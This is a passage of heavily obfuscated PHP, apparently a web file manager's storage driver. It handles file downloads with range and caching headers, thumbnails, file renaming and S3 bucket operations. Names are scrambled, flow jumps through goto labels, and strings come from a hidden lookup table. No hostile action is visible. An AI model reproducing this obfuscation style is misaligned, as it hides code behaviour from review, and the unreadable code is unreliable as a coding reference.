$GLOBALS[$e◊åèßÿ∞‹[6]][$e◊åèßÿ∞‹[88]][$e◊åèßÿ∞‹[107]][$e◊åèßÿ∞‹[108]]; $fòÚœ≤°Ö¬ = (double) $GLOBALS[$e◊åèßÿ∞‹[6]][$e◊åèßÿ∞‹[88]][$e◊åèßÿ∞‹[107]][$e◊åèßÿ∞‹[109]] * 1024 * 1024; goto eå©¡õéÊ√; D†êÛà›ˆ£: if (in_array($b¨ë‰∞≤´û, array($e◊åèßÿ∞‹[111], $e◊åèßÿ∞‹[112], $e◊åèßÿ∞‹[113], $e◊åèßÿ∞‹[114]))) { $b¨ë‰∞≤´û = $e◊åèßÿ∞‹[115]; } if (!$D®€ıº±àÜ) { $D®€ıº±àÜ = md5($fùñ¶†ò—√ . $this->hashSimple($BÔ«∂íö)); } $D®€ıº±àÜ = $e◊åèßÿ∞‹[116] . $D®€ıº±àÜ . $e◊åèßÿ∞‹[116]; goto aÖ ÆÖâèè; fª®û¡Ω∂è: header($e◊åèßÿ∞‹[128]); header($e◊åèßÿ∞‹[129]); header($e◊åèßÿ∞‹[130]); goto D⁄á®Ñ∫ìë; DÊÁå·éÜ: $C¡ÁÑÃ™ëÌ = strtolower($_SERVER[$e◊åèßÿ∞‹[142]]); if ($A•—°ƒ··ü && $C¡ÁÑÃ™ëÌ && $Dﬂ›Ü¡ÂÑâ) { if (strstr($C¡ÁÑÃ™ëÌ, $e◊åèßÿ∞‹[143])) { header($e◊åèßÿ∞‹[144] . $BÔ«∂íö); } else { if (strstr($C¡ÁÑÃ™ëÌ, $e◊åèßÿ∞‹[145])) { header($e◊åèßÿ∞‹[146] . $BÔ«∂íö); } else { if (strstr($C¡ÁÑÃ™ëÌ, $e◊åèßÿ∞‹[147])) { header($e◊åèßÿ∞‹[148] . $BÔ«∂íö); } } } if ($fòÚœ≤°Ö¬) { header($e◊åèßÿ∞‹[149] . $fòÚœ≤°Ö¬); } return; } if (isset($_SERVER[$e◊åèßÿ∞‹[150]])) { if (preg_match($e◊åèßÿ∞‹[151], $_SERVER[$e◊åèßÿ∞‹[150]], $aÿ¯åâ¬∞–)) { $c≈Â˜åˆê∆ = intval($aÿ¯åâ¬∞–[1]); if (!empty($aÿ¯åâ¬∞–[2])) { $Dñúòø¶Ø´ = intval($aÿ¯åâ¬∞–[2]); } } header($e◊åèßÿ∞‹[152]); header("\103\x6f\x6e\x74\x65\156\x74\x2d\122\141\156\147\145\x3a\x20\x62\171\x74\x65\163\40{$c≈Â˜åˆê∆}\55{$Dñúòø¶Ø´}\x2f" . $AﬁÁ¡Íï¢¯); } else { header($e◊åèßÿ∞‹[153]); } goto d©Ó¯•Ç„£; eÕÀÊæÒıÙ: header($e◊åèßÿ∞‹[135] . $fùñ¶†ò—√ . $e◊åèßÿ∞‹[127]); header($e◊åèßÿ∞‹[136] . $eó™°Ø∆◊ ); header($e◊åèßÿ∞‹[137]); goto bÒ ˆ◊ﬁ«ä; eå©¡õéÊ√: @ob_end_clean(); set_timeout(); $bÈÔ” »œè = $this->infoFull($BÔ«∂íö); goto F–Ë‰ù©õ·; d©Ó¯•Ç„£: $d£ûÖ˘óÑå = !0; if ($_SERVER[$e◊åèßÿ∞‹[154]] == $e◊åèßÿ∞‹[155] && $AﬁÁ¡Íï¢¯ > 1204 * 1024 * 1024 * 2) { $d£ûÖ˘óÑå = !1; } if ($d£ûÖ˘óÑå) { header($e◊åèßÿ∞‹[156] . ($Dñúòø¶Ø´ - $c≈Â˜åˆê∆ + 1)); } goto eÖéÈ›“è®; D”ÜìßÉ Ã: $c≈Â˜åˆê∆ = 0; $Dñúòø¶Ø´ = $AﬁÁ¡Íï¢¯ - 1; $b¨ë‰∞≤´û = $this->ext($eó™°Ø∆◊ ); goto D†êÛà›ˆ£; bÒ ˆ◊ﬁ«ä: header($e◊åèßÿ∞‹[138] . $AﬁÁ¡Íï¢¯); header($e◊åèßÿ∞‹[139]); if (!$F‹≠øé’ßù && $b¨ë‰∞≤´û == $e◊åèßÿ∞‹[140]) { if ($AﬁÁ¡Íï¢¯ > 1024 * 1024 * 5) { die; } $eƒ‘“€“æÆ = $this->getContent($BÔ«∂íö); $eƒ‘“€“æÆ = Html::clearSVG($eƒ‘“€“æÆ); header($e◊åèßÿ∞‹[141] . strlen($eƒ‘“€“æÆ)); echo $eƒ‘“€“æÆ; die; } goto DÊÁå·éÜ; BÑ∞Ü‘úêè: $e◊åèßÿ∞‹ =& $_SERVER[ú∫]; $this->cacheMethod(null, null); if (!$BÔ«∂íö || !$this->exist($BÔ«∂íö)) { show_json(LNG($e◊åèßÿ∞‹[105]), !1, $c‚”Ò¥ƒ¡Ô); } goto A∫èÎÑ¯ÍË; eÖéÈ›“è®: if ($_SERVER[$e◊åèßÿ∞‹[157]] == $e◊åèßÿ∞‹[158]) { return; } $fÉïÓ¶ïÏ˜ = 1024 * 100; $bµ¥»°∆äƒ = 0; goto b—„íœÎ–ﬂ; D⁄á®Ñ∫ìë: if (isset($_SERVER[$e◊åèßÿ∞‹[131]]) && strtotime($_SERVER[$e◊åèßÿ∞‹[131]]) == $bÈÔ” »œè[$e◊åèßÿ∞‹[84]]) { header($e◊åèßÿ∞‹[132], !0, 304); die; } if (isset($_SERVER[$e◊åèßÿ∞‹[133]]) && $_SERVER[$e◊åèßÿ∞‹[133]] == $D®€ıº±àÜ) { header($e◊åèßÿ∞‹[134] . $D®€ıº±àÜ, !0, 304); die; } header($e◊åèßÿ∞‹[134] . $D®€ıº±àÜ); goto eÕÀÊæÒıÙ; c⁄ÖÚÙ¥ﬂâ: header($e◊åèßÿ∞‹[120]); header($e◊åèßÿ∞‹[121] . $b¡Ùöú¡ú´); $AÏ ˘Œñú± = rawurlencode($eó™°Ø∆◊ ); goto fÕÇ≠¢ÏÛÙ; B¬ †‹ΩŸı: } public function fileOutServer($bß¡‘°Ù÷Ü, $Cêí¶º√•’ = false, $e÷ó€‚úó¬ = false, $C‡Ö«†ﬂñ = '') { $this->fileOut($bß¡‘°Ù÷Ü, $Cêí¶º√•’, $e÷ó€‚úó¬, $C‡Ö«†ﬂñ); } public function fileOutLink($E—€ƒ•ê€Ò) { header($_SERVER[ú∫][159] . $E—€ƒ•ê€Ò); die; } public function cacheMethod($AÈ˜Á“Íù≤, $C◊ààÿ…˘§, $fçŒôç∏üÚ = null) { goto bô¿é¢∞®µ; E“’‹Ãª„£: $B∆Àò–≤»Õ = $this->{$AÈ˜Á“Íù≤}($C◊ààÿ…˘§); $EóÇàéÌ≥π[$Aèﬂ™≠Ç≈ÿ] = $B∆Àò–≤»Õ; return $B∆Àò–≤»Õ; goto Aù…ıùîàå; bô¿é¢∞®µ: $AÈü¿“Üñˆ =& $_SERVER[ú∫]; static $EóÇàéÌ≥π = array(); $e›¡êÜ›‚Ò = $C◊ààÿ…˘§ ? ltrim($this->getPathOuter($C◊ààÿ…˘§), $AÈü¿“Üñˆ[8]) : $C◊ààÿ…˘§; goto CªÓÂõ¢Ô⁄; b‡ßÿ√≈ƒˆ: if (!is_null($fçŒôç∏üÚ)) { $EóÇàéÌ≥π[$Aèﬂ™≠Ç≈ÿ] = $fçŒôç∏üÚ; return; } $B∆Àò–≤»Õ = isset($EóÇàéÌ≥π[$Aèﬂ™≠Ç≈ÿ]) ? $EóÇàéÌ≥π[$Aèﬂ™≠Ç≈ÿ] : null; if (!is_null($B∆Àò–≤»Õ)) { return $B∆Àò–≤»Õ; } goto E“’‹Ãª„£; CªÓÂõ¢Ô⁄: $Aèﬂ™≠Ç≈ÿ = $AÈü¿“Üñˆ[160] . $AÈ˜Á“Íù≤ . $AÈü¿“Üñˆ[161] . rtrim($e›¡êÜ›‚Ò, $AÈü¿“Üñˆ[8]); if (is_null($AÈ˜Á“Íù≤)) { $EóÇàéÌ≥π = array(); return; } if (is_null($C◊ààÿ…˘§)) { unset($EóÇàéÌ≥π[$Aèﬂ™≠Ç≈ÿ]); return; } goto b‡ßÿ√≈ƒˆ; Aù…ıùîàå: } public function fileOutImage($A≠Õ«ØìÌÿ, $D‡∆ÍÜ¨ÀÕ = 250) { goto e¯ïÉúﬁ„±; fçﬂäÿ‰∂ë: if (!@file_exists($F´Öæ’«⁄ã)) { $b»ºÇÌü¡Æ = TEMP_FILES; if (!is_dir($b»ºÇÌü¡Æ)) { mk_dir($b»ºÇÌü¡Æ); } $bµ¨™ÙøàÔ = $b»ºÇÌü¡Æ . $bÖ±› Àçç . $aŒÈµπªªÁ[95] . $b‡Íß¯≈íå[$aŒÈµπªªÁ[168]]; if (!@file_exists($bµ¨™ÙøàÔ)) { $bµ¨™ÙøàÔ = $this->download($A≠Õ«ØìÌÿ, $bµ¨™ÙøàÔ); } ImageThumb::createThumb($bµ¨™ÙøàÔ, $F´Öæ’«⁄ã, $D‡∆ÍÜ¨ÀÕ, $D‡∆ÍÜ¨ÀÕ * 10); } if (!file_exists($F´Öæ’«⁄ã) || filesize($F´Öæ’«⁄ã) < 100) { return @file_exists($bµ¨™ÙøàÔ) ? IO::fileOut($bµ¨™ÙøàÔ) : $this->fileOut($A≠Õ«ØìÌÿ); } if (!($eù”ˆè•á∑ = IO::move($F´Öæ’«⁄ã, $eƒ’Í∞î’å))) { return IO::fileOut($F´Öæ’«⁄ã); } goto Aôﬁ§¡˜·–; Fœ‹»≤Ô—È: if (isset($GLOBALS[$aŒÈµπªªÁ[162]]) && $GLOBALS[$aŒÈµπªªÁ[162]][$aŒÈµπªªÁ[76]] == $b‡Íß¯≈íå[$aŒÈµπªªÁ[76]]) { $eåΩ√ô©ï∂ = $GLOBALS[$aŒÈµπªªÁ[162]][$aŒÈµπªªÁ[163]]; if (!$b‡Íß¯≈íå[$aŒÈµπªªÁ[164]]) { $b‡Íß¯≈íå[$aŒÈµπªªÁ[164]] = $GLOBALS[$aŒÈµπªªÁ[162]]; } if (isset($eåΩ√ô©ï∂[$aŒÈµπªªÁ[165]])) { if ($eåΩ√ô©ï∂[$aŒÈµπªªÁ[165]] <= $D‡∆ÍÜ¨ÀÕ && $eåΩ√ô©ï∂[$aŒÈµπªªÁ[166]] <= $D‡∆ÍÜ¨ÀÕ) { $B»Ÿ±∏äÓœ = !0; } } $c≥¬®´¡∏Ÿ = $b‡Íß¯≈íå[$aŒÈµπªªÁ[164]][$aŒÈµπªªÁ[28]]; } if ($b‡Íß¯≈íå[$aŒÈµπªªÁ[78]] <= 1024 * 50 || $B»Ÿ±∏äÓœ || !function_exists($aŒÈµπªªÁ[167]) || $b‡Íß¯≈íå[$aŒÈµπªªÁ[168]] == $aŒÈµπªªÁ[169]) { return $this->fileOut($A≠Õ«ØìÌÿ, !1, $c≥¬®´¡∏Ÿ); } if (isset($b‡Íß¯≈íå[$aŒÈµπªªÁ[164]][$aŒÈµπªªÁ[170]])) { $bÖ±› Àçç = $b‡Íß¯≈íå[$aŒÈµπªªÁ[164]][$aŒÈµπªªÁ[170]]; } else { if (isset($b‡Íß¯≈íå[$aŒÈµπªªÁ[164]][$aŒÈµπªªÁ[171]])) { $bÖ±› Àçç = $b‡Íß¯≈íå[$aŒÈµπªªÁ[164]][$aŒÈµπªªÁ[171]]; } else { $bÖ±› Àçç = md5("{$b‡Íß¯≈íå[$aŒÈµπªªÁ[28]]}\137{$b‡Íß¯≈íå[$aŒÈµπªªÁ[76]]}\x5f{$b‡Íß¯≈íå[$aŒÈµπªªÁ[78]]}"); } } goto fü∏¨¶ﬂΩ®; Aôﬁ§¡˜·–: del_file($F´Öæ’«⁄ã); IO::fileOut($eù”ˆè•á∑); goto c£æÉ∫°Öã; e¯ïÉúﬁ„±: $aŒÈµπªªÁ =& $_SERVER[ú∫]; set_timeout(); if (substr($A≠Õ«ØìÌÿ, 0, 4) == $aŒÈµπªªÁ[147]) { $this->fileOutLink($A≠Õ«ØìÌÿ); } goto dó∏‹ÀÜ≥Ò; fü∏¨¶ﬂΩ®: $A⁄È®√åå« = "{$bÖ±› Àçç}\x5f{$D‡∆ÍÜ¨ÀÕ}\56\x70\156\x67"; if (!($c∆ÕÁñâ√‘ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $aŒÈµπªªÁ[172]))) { $eƒ’Í∞î’å = IO::mkdir(IO_PATH_SYSTEM_TEMP . $aŒÈµπªªÁ[173]); } else { $eƒ’Í∞î’å = KodIO::make($c∆ÕÁñâ√‘); } if ($c∆ÕÁñâ√‘ = IO::fileNameExist($eƒ’Í∞î’å, $A⁄È®√åå«)) { $F´Öæ’«⁄ã = KodIO::make($c∆ÕÁñâ√‘); return IO::fileOut($F´Öæ’«⁄ã, !1, $c≥¬®´¡∏Ÿ); } goto Eæ∂Ç¥ó©ª; Eæ∂Ç¥ó©ª: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $F´Öæ’«⁄ã = DATA_THUMB . $A⁄È®√åå«; del_file($F´Öæ’«⁄ã); goto fçﬂäÿ‰∂ë; dó∏‹ÀÜ≥Ò: $b‡Íß¯≈íå = $this->info($A≠Õ«ØìÌÿ); $c≥¬®´¡∏Ÿ = $b‡Íß¯≈íå[$aŒÈµπªªÁ[28]]; $B»Ÿ±∏äÓœ = !1; goto Fœ‹»≤Ô—È; c£æÉ∫°Öã: } public function fileOutImageServer($bôŒ–’∑ÒÇ, $eñƒÓç”ä™ = 250) { $this->fileOutImage($bôŒ–’∑ÒÇ, $eñƒÓç”ä™); } public function fileNameAuto($BòÖ¬´¯æ‘, $Eî„ûûùé, $c˘Ûç∑êÚ˘ = REPEAT_RENAME, $C¢Ö∑∂ÖÎü = false) { goto Eéè´ÆñËÔ; D±ñÇµê˘Ø: if ($c˘Ûç∑êÚ˘ == REPEAT_SKIP) { return !1; } $Døéíç–Ü£ = $fñ”œèÑ§Ë[95] . get_path_ext($Eî„ûûùé); $Døéíç–Ü£ = $Døéíç–Ü£ == $fñ”œèÑ§Ë[95] || $C¢Ö∑∂ÖÎü ? $fñ”œèÑ§Ë[33] : $Døéíç–Ü£; goto b¡ª¨Õ™◊æ; Eéè´ÆñËÔ: $fñ”œèÑ§Ë =& $_SERVER[ú∫]; $A≠§∂¯∞„¨ = $BòÖ¬´¯æ‘ === $fñ”œèÑ§Ë[33] ? $Eî„ûûùé : rtrim($BòÖ¬´¯æ‘, $fñ”œèÑ§Ë[8]) . $fñ”œèÑ§Ë[8] . $Eî„ûûùé; if ($c˘Ûç∑êÚ˘ == REPEAT_REPLACE || !$this->exist($A≠§∂¯∞„¨) || $C¢Ö∑∂ÖÎü && $c˘Ûç∑êÚ˘ != REPEAT_RENAME_FOLDER) { return $Eî„ûûùé; } goto D±ñÇµê˘Ø; b¡ª¨Õ™◊æ: $D∑±“≈ë∑á = 1; $Bà”√êëâﬁ = substr($Eî„ûûùé, 0, strlen($Eî„ûûùé) - strlen($Døéíç–Ü£)); $F©Ωà¢Õ≈ = $Bà”√êëâﬁ . "\x28{$D∑±“≈ë∑á}\51{$Døéíç–Ü£}"; goto d‹ºÙ›Î–Í; d‹ºÙ›Î–Í: while ($this->exist(rtrim($BòÖ¬´¯æ‘, $fñ”œèÑ§Ë[8]) . $fñ”œèÑ§Ë[8] . $F©Ωà¢Õ≈)) { $F©Ωà¢Õ≈ = $Bà”√êëâﬁ . "\x28{$D∑±“≈ë∑á}\51{$Døéíç–Ü£}"; $D∑±“≈ë∑á++; } return $F©Ωà¢Õ≈; goto d≠ÃÎ√†—é; d≠ÃÎ√†—é: } private function fileNameAutoList($dâ∑ï“Ü‚„, $DˆÕÂ‡í˜, $bñÿœâ≈ÙÖ = false) { goto BÓÕ¿ÃÀ≤ü; E‘©ÿ⁄¶¬ˆ: return $d≤œãâëÚ±; goto B•™ ùñ±á; CÜ÷ÿ’§Ñ®: $E∂ÜïïíÂç = substr($DˆÕÂ‡í˜, 0, strlen($DˆÕÂ‡í˜) - strlen($BÏ¢∂â®ºó)); $d≤œãâëÚ± = $E∂ÜïïíÂç . "\x28\60\x29{$BÏ¢∂â®ºó}"; for ($fëôÜøÃáì = 1; $fëôÜøÃáì <= count($a©£ –ö‰À) + 1; $fëôÜøÃáì++) { $d≤œãâëÚ± = $E∂ÜïïíÂç . "\50{$fëôÜøÃáì}\51{$BÏ¢∂â®ºó}"; if (!in_array_not_case($d≤œãâëÚ±, $a©£ –ö‰À)) { return $d≤œãâëÚ±; } } goto E‘©ÿ⁄¶¬ˆ; BÓÕ¿ÃÀ≤ü: $CßÜÜ√ﬂïØ =& $_SERVER[ú∫]; $d˘»˘®∫ôÿ = $this->listPath($dâ∑ï“Ü‚„, !0); $d˘»˘®∫ôÿ = array_merge($d˘»˘®∫ôÿ[$CßÜÜ√ﬂïØ[75]], $d˘»˘®∫ôÿ[$CßÜÜ√ﬂïØ[74]]); goto fÍÖ“Íùà£; fÍÖ“Íùà£: $a©£ –ö‰À = array_to_keyvalue($d˘»˘®∫ôÿ, $CßÜÜ√ﬂïØ[33], $CßÜÜ√ﬂïØ[28]); $BÏ¢∂â®ºó = $CßÜÜ√ﬂïØ[95] . get_path_ext($DˆÕÂ‡í˜); $BÏ¢∂â®ºó = $BÏ¢∂â®ºó == $CßÜÜ√ﬂïØ[95] || $bñÿœâ≈ÙÖ ? $CßÜÜ√ﬂïØ[33] : $BÏ¢∂â®ºó; goto CÜ÷ÿ’§Ñ®; B•™ ùñ±á: } public function listAllFiles($aèïåÿÕÖ™, $a£Ë£è’í≠, $F÷âÙ›á©Ò = array()) { goto eæò†ﬂ⁄ûÕ; AÛ÷ôÜÙ◊ë: $aèïåÿÕÖ™ = trim($aèïåÿÕÖ™, $dÌ⁄¿Ë∂‰Ó[8]); foreach ($a£Ë£è’í≠ as $bè∑Úº√ΩÚ) { $BœÌóøöÎ∏ = ltrim(substr(trim($bè∑Úº√ΩÚ, $dÌ⁄¿Ë∂‰Ó[8]), strlen($aèïåÿÕÖ™)), $dÌ⁄¿Ë∂‰Ó[8]); $f∆ì’ò¢ô¥ = array_merge($f∆ì’ò¢ô¥, $this->slicePath($BœÌóøöÎ∏)); } $e¯÷¡•ÇÏ° = array(); goto eöò°∑©ëè; eæò†ﬂ⁄ûÕ: $dÌ⁄¿Ë∂‰Ó =& $_SERVER[ú∫]; if (empty($a£Ë£è’í≠)) { return array(); } $f∆ì’ò¢ô¥ = array(); goto AÛ÷ôÜÙ◊ë; eöò°∑©ëè: foreach (array_unique($f∆ì’ò¢ô¥) as $bè∑Úº√ΩÚ) { $B˜àáÍ•Œö = array($dÌ⁄¿Ë∂‰Ó[76] => $this->getPathOuter($dÌ⁄¿Ë∂‰Ó[8] . $aèïåÿÕÖ™ . $dÌ⁄¿Ë∂‰Ó[8] . $bè∑Úº√ΩÚ), $dÌ⁄¿Ë∂‰Ó[77] => 1, $dÌ⁄¿Ë∂‰Ó[78] => 0); if (substr($bè∑Úº√ΩÚ, -1) != $dÌ⁄¿Ë∂‰Ó[8]) { $B˜àáÍ•Œö[$dÌ⁄¿Ë∂‰Ó[77]] = 0; $Eøø¡≤“ıŸ = $this->getPath($aèïåÿÕÖ™ . $dÌ⁄¿Ë∂‰Ó[8] . $bè∑Úº√ΩÚ); $B˜àáÍ•Œö[$dÌ⁄¿Ë∂‰Ó[78]] = isset($F÷âÙ›á©Ò[$Eøø¡≤“ıŸ]) ? $F÷âÙ›á©Ò[$Eøø¡≤“ıŸ] : $this->size($Eøø¡≤“ıŸ); } $e¯÷¡•ÇÏ°[] = $B˜àáÍ•Œö; } return $e¯÷¡•ÇÏ°; goto CÜˆÜ∏¥ÆÉ; CÜˆÜ∏¥ÆÉ: } public function slicePath($bï¯´ÿ≠õ√) { $B€ıòÁ≠Îÿ =& $_SERVER[ú∫]; $aÖõÜ‚¬ÏÉ = explode($B€ıòÁ≠Îÿ[8], trim($bï¯´ÿ≠õ√, $B€ıòÁ≠Îÿ[8])); $E¢‘Ú®”∫Â = 0; do { ++$E¢‘Ú®”∫Â; $c‹Œáå›á [] = implode($B€ıòÁ≠Îÿ[8], array_slice($aÖõÜ‚¬ÏÉ, 0, $E¢‘Ú®”∫Â)) . $B€ıòÁ≠Îÿ[8]; } while ($E¢‘Ú®”∫Â < count($aÖõÜ‚¬ÏÉ)); $c‹Œáå›á [count($aÖõÜ‚¬ÏÉ) - 1] = $bï¯´ÿ≠õ√; return $c‹Œáå›á ; } public function getHost() { $D∑≈ŸöÑ¯À =& $_SERVER[ú∫]; $bÚ¯ç¡ûπã = parse_url(trim($this->domain, $D∑≈ŸöÑ¯À[8])); $FåÔé≤∆£¶ = isset($bÚ¯ç¡ûπã[$D∑≈ŸöÑ¯À[174]]) ? $bÚ¯ç¡ûπã[$D∑≈ŸöÑ¯À[174]] : http_type(); $A„Ù¯≠ËµÎ = isset($bÚ¯ç¡ûπã[$D∑≈ŸöÑ¯À[175]]) ? $bÚ¯ç¡ûπã[$D∑≈ŸöÑ¯À[175]] : $bÚ¯ç¡ûπã[$D∑≈ŸöÑ¯À[76]]; if (isset($bÚ¯ç¡ûπã[$D∑≈ŸöÑ¯À[176]])) { $A„Ù¯≠ËµÎ .= $D∑≈ŸöÑ¯À[4] . $bÚ¯ç¡ûπã[$D∑≈ŸöÑ¯À[176]]; } return $FåÔé≤∆£¶ . $D∑≈ŸöÑ¯À[177] . $A„Ù¯≠ËµÎ; } public function pathEncode($f’ãıì∏°Ç) { $FŒîÓ‡‚≤ª =& $_SERVER[ú∫]; return str_replace($FŒîÓ‡‚≤ª[178], $FŒîÓ‡‚≤ª[8], rawurlencode($f’ãıì∏°Ç)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($A≈¨ﬁñ€¢Á) { set_timeout(); require_once SDK_DIR . $_SERVER[ú∫][179]; parent::__construct(); $this->_init($A≈¨ﬁñ€¢Á); } public function _init($c•™Ô‘∏°¬) { foreach ($c•™Ô‘∏°¬ as $bú”Óäñº… => $d÷∂›òﬁÒ°) { if (isset($this->{$bú”Óäñº…})) { $this->{$bú”Óäñº…} = $d÷∂›òﬁÒ°; } } $this->endpoint = $c•™Ô‘∏°¬[$_SERVER[ú∫][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($e‡»ÿãäŸ = "\166\x34") { $this->signVer = $e‡»ÿãäŸ; $this->client->setSignatureVersion($e‡»ÿãäŸ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto E÷«∑†ƒ∑ˆ; E÷«∑†ƒ∑ˆ: $Eñäñ†‚√Ö =& $_SERVER[ú∫]; $dèΩÔ‘ãáÕ = $this->getBucketCors(); if (!$dèΩÔ‘ãáÕ || !is_array($dèΩÔ‘ãáÕ)) { return !1; } goto d∆òéÂ•Ö’; béÚêÇé÷§: $Dª∑ñ≤†â» = array($Eñäñ†‚√Ö[186], $Eñäñ†‚√Ö[187], $Eñäñ†‚√Ö[188], $Eñäñ†‚√Ö[189], $Eñäñ†‚√Ö[190]); $C‡ﬂÀÙ—†≈ = array_diff($Dª∑ñ≤†â», $BÜßß§€∆–); return empty($C‡ﬂÀÙ—†≈); goto fÉ›êﬂÃ≠˘; d∆òéÂ•Ö’: if ($dèΩÔ‘ãáÕ[$Eñäñ†‚√Ö[181]] != $Eñäñ†‚√Ö[182] || $dèΩÔ‘ãáÕ[$Eñäñ†‚√Ö[183]] != $Eñäñ†‚√Ö[182]) { return !1; } $BÜßß§€∆– = array_map($Eñäñ†‚√Ö[184], $dèΩÔ‘ãáÕ[$Eñäñ†‚√Ö[185]]); if (!is_array($BÜßß§€∆–)) { $BÜßß§€∆– = array(); } goto béÚêÇé÷§; fÉ›êﬂÃ≠˘: } public function mkfile($fƒﬁ‘·‘øÖ, $c≤åıË≈›≠ = '', $f‡ÑÇãÆõ  = REPEAT_RENAME) { $aëÙŒ≠´˜– = $this->setContent($fƒﬁ‘·‘øÖ, $c≤åıË≈›≠); if ($aëÙŒ≠´˜– !== !1) { return $this->getPathOuter($fƒﬁ‘·‘øÖ); } return !1; } public function mkdir($FÍõèÎ∏¨ä, $F±àπ≈„»Û = REPEAT_SKIP) { $cÎ„»ñÃÜ´ =& $_SERVER[ú∫]; if (empty($FÍõèÎ∏¨ä) && $FÍõèÎ∏¨ä !== $cÎ„»ñÃÜ´[191]) { return !1; } if ($this->_isFolder($FÍõèÎ∏¨ä)) { return $this->getPathOuter($FÍõèÎ∏¨ä); } $aßÉ⁄∂¥÷› = $this->setContent($FÍõèÎ∏¨ä, $cÎ„»ñÃÜ´[33], !0); if ($aßÉ⁄∂¥÷› !== !1) { return $this->getPathOuter($FÍõèÎ∏¨ä); } return !1; } public function copyFile($Cá•âœØÿ—, $EÏ„ùôòòü, $bÊß˘•—ıﬂ = array()) { $Eÿ€ Á»É“ =& $_SERVER[ú∫]; $E’ú∏ÖÖá≈ = $this->objectMeta($Cá•âœØÿ—); if (!$E’ú∏ÖÖá≈) { return !1; } if ($E’ú∏ÖÖá≈[$Eÿ€ Á»É“[78]] <= 1024 * 1024 * 200) { $C€ç√£‘’Û = $this->client->copyObject($this->bucket, $Cá•âœØÿ—, $this->bucket, $EÏ„ùôòòü, $Eÿ€ Á»É“[192], $bÊß˘•—ıﬂ); } else { $C€ç√£‘’Û = $this->client->multiCopyObject($this->bucket, $Cá•âœØÿ—, $this->bucket, $EÏ„ùôòòü, $bÊß˘•—ıﬂ); } $C€ç√£‘’Û = $C€ç√£‘’Û ? $this->getPathOuter($EÏ„ùôòòü) : !1; return $C€ç√£‘’Û; } public function moveFile($d¡Î¥¢í§ƒ, $Eı∂¡ï—ÒΩ) { if ($this->copyFile($d¡Î¥¢í§ƒ, $Eı∂¡ï—ÒΩ)) { $this->delFile($d¡Î¥¢í§ƒ); return $this->getPathOuter($Eı∂¡ï—ÒΩ); } return !1; } public function delFile($BÛºâ÷Ô¢√) { return $this->client->deleteObject($this->bucket, $BÛºâ÷Ô¢√); } public function delFolder($A’ù∆–›º∑) { goto a•–ùäå‰‚; DÜ±ÜùÆƒë: $AêÒ≈‡√«Ç = $this->fileList($A’ù∆–›º∑); $this->listItemCache = !0; $A∫ˆûÕÒÛ“ = trim($A’ù∆–›º∑, $D£çÿÔ÷Ú‡[8]) . $D£çÿÔ÷Ú‡[8]; goto a¨ëØ¿§‰®; a¨ëØ¿§‰®: if (!empty($A’ù∆–›º∑) && $A’ù∆–›º∑ !== $D£çÿÔ÷Ú‡[191] && !in_array($A∫ˆûÕÒÛ“, $AêÒ≈‡√«Ç[$D£çÿÔ÷Ú‡[75]])) { $AêÒ≈‡√«Ç[$D£çÿÔ÷Ú‡[75]][] = $A∫ˆûÕÒÛ“; } $fèØ˜¯Ωá™ = $this->delByBatch($AêÒ≈‡√«Ç[$D£çÿÔ÷Ú‡[74]]); if (!$fèØ˜¯Ωá™) { return !1; } goto Aﬂ≠ÎˆπΩ; a•–ùäå‰‚: $D£çÿÔ÷Ú‡ =& $_SERVER[ú∫]; if (!$this->exist($A’ù∆–›º∑)) { return !0; } $this->listItemCache = !1; goto DÜ±ÜùÆƒë; Aﬂ≠ÎˆπΩ: $fèØ˜¯Ωá™ = $this->delByBatch($AêÒ≈‡√«Ç[$D£çÿÔ÷Ú‡[75]]); if (!$fèØ˜¯Ωá™) { return !1; } return $this->delFile($A∫ˆûÕÒÛ“); goto BçπÁŒ¿€√; BçπÁŒ¿€√: } private function delByBatch($dÌò∞¨—⁄ä) { foreach (array_chunk($dÌò∞¨—⁄ä, 1000) as $B√Óã„ñ´“) { $Cÿòœ∑¡ßí = $this->client->deleteObjects($this->bucket, $B√Óã„ñ´“); if (!$Cÿòœ∑¡ßí) { return !1; } } return !0; } public function rename($B¯◊ΩˆÈˆ—, $A®üäß´√Ò) { return $this->renameObject($B¯◊ΩˆÈˆ—, $A®üäß´√Ò); } public function listPath($a∑ªÿ’ù⁄ú, $eœ∆‚¶⁄¡∫ = false) { $BÇ†‡÷Ø‰÷ =& $_SERVER[ú∫]; $b◊»±óüı∆ = $this->fileList($a∑ªÿ’ù⁄ú, $BÇ†‡÷Ø‰÷[8], !0); foreach ($b◊»±óüı∆[$BÇ†‡÷Ø‰÷[75]] as $dàõ™‡ç¿ä => $cøÃé¡ñ¿√) { $b◊»±óüı∆[$BÇ†‡÷Ø‰÷[75]][$dàõ™‡ç¿ä] = $this->folderInfo($cøÃé¡ñ¿√, $eœ∆‚¶⁄¡∫); } foreach ($b◊»±óüı∆[$BÇ†‡÷Ø‰÷[74]] as $dàõ™‡ç¿ä => $cøÃé¡ñ¿√) { $b◊»±óüı∆[$BÇ†‡÷Ø‰÷[74]][$dàõ™‡ç¿ä] = $this->fileInfo($cøÃé¡ñ¿√[$BÇ†‡÷Ø‰÷[28]], $eœ∆‚¶⁄¡∫, $cøÃé¡ñ¿√); } return $b◊»±óüı∆; } private function fileInfo($EÂ⁄Úô∏≠é, $d¡“„¯í»ÿ = false, $d‚›·û…‹â = array()) { goto Fúœë‚ôìà; Fúœë‚ôìà: $d‹†à∫Î‡” =& $_SERVER[ú∫]; $DÁ¶›ΩŸÉü = array($d‹†à∫Î‡”[28] => $this->pathThis($EÂ⁄Úô∏≠é), $d‹†à∫Î‡”[76] => $this->getPathOuter($EÂ⁄Úô∏≠é), $d‹†à∫Î‡”[29] => $d‹†à∫Î‡”[193], $d‹†à∫Î‡”[168] => $this->ext($EÂ⁄Úô∏≠é), $d‹†à∫Î‡”[78] => isset($d‚›·û…‹â[$d‹†à∫Î‡”[78]]) ? 